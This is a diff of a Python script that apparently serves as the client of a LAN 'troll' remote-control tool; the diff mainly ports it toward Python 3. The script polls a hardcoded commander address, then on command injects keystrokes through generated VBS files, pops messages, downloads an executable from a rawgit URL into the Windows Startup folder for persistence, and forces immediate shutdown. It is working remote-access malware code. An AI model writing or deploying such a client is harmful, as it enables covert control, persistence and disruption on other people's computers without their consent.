@@ -1,26 +1,26 @@
 #!/usr/bin/python
-import socket, time, sys, os, urllib, pyttsx
+import socket, time, sys, os, urllib#, pyttsx
 from subprocess import call
 #from pathlib import Path
 while True:
     s = socket.socket()
     port = 12345
     try:
-        s.connect(('10.64.41.123', port))
+        s.connect(('192.168.1.888', port))
         command = s.recv(1024)
-        print("Command recieved: "+command)
+        print("Command recieved: "+str(command))
     except socket.error as err:
         print("Sergeant Commander on a break(Commander offline or unavailable)")
         time.sleep(3)
         continue
-    command1 = command.split(" ",1)
+    command1 = str(command).split(" ",1)
     path = os.environ["HOMEPATH"]
     print(path)
     if "ghostkeys" in str(command1[0]):
         path = os.environ["HOMEPATH"]
         finalpathk = "C:"+path+"\Desktop\\keyboard.vbs"
         message = command.split(" ",1)
-        print message[1]
+        print(message[1])
         if not os.path.isfile(finalpathk) == True:
             print("keyboard.vbs doesnt exist, creating a new one")
             print(finalpathk)
@@ -37,7 +37,7 @@ wshshell.sendkeys keyboardtext
 
     elif "message" in str(command1[0]):
         message = command.split(" ",1)
-        print message[1]
+        print(message[1])
         path = os.environ["HOMEPATH"]
         finalpathm = "C:"+path+"\Desktop"+"\message.vbs"
         if not os.path.isfile(finalpathm) == True:
@@ -156,12 +156,13 @@ loop
 
     elif "install" in str(command1[0]):
         downloadlocation = "C:"+path+"\AppData\\Roaming\\Microsoft\Windows\Start Menu\Programs\Startup\minion.exe"
-        url = 'https://rawgit.com/kres0345/LANTroll/master/commander/minion.exe'
+        url = 'http://rawgit.com/kres0345/LANTroll/master/commander/minion.exe'
         print("Installing")
         try:
             urllib.urlretrieve(url, downloadlocation)
-        except:
-            print("Well, somethings wrong")
+        except Exception as err:
+            print("Well, somethings wrong"+str(err))
+            
         print("Done")
 
     elif "uninstall" in str(command1[0]):
@@ -176,25 +177,25 @@ loop
     elif "restart101" in str(command1[0]):
         downloadlocation = "C:"+path+"\AppData\\Roaming\\Microsoft\Windows\Start Menu\Programs\Startup\minion.exe"
         print("Restarting Minion")
-        print downloadlocation
+        print(downloadlocation)
         try:
             os.startfile(downloadlocation)
             sys.exit()
-            print "done"
+            print("done")
         except:
             pass
             #print("Not restarting becouse minion isnt installed in startup folder")
             #time.sleep(10)
     elif "instantshutdown" in str(command1[0]):
         call(["shutdown", "-s", "-t", "0"])
-    
+    '''
     elif "tts" in str(command1[0]):
         print("Text 2 Speech")
         tts = command.split(" ",1)
         print(tts)
         engine = pyttsx.init()
         engine.say(tts[1])
-        engine.runAndWait()
+        engine.runAndWait()'''
         
     time.sleep(10)
     s.close()
